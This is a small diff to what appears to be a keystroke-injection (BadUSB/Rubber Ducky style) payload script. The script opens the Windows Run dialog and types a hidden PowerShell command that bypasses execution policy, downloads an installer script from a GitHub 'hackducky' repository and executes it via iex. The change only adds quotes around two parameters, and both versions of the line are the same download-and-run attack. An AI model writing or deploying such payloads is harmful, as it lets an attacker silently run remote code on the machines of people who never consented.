@@ -5,5 +5,5 @@ DEFINE #METHOD 1
 
 GUI R
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $env:url=#URL;$env:method=#METHOD;irm https://github.com/Sushi-Mampfer/hackducky/raw/refs/heads/main/submissions/installer/installer.ps | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass $env:url="#URL";$env:method="#METHOD";irm https://github.com/Sushi-Mampfer/hackducky/raw/refs/heads/main/submissions/installer/installer.ps | iex
 ENTER
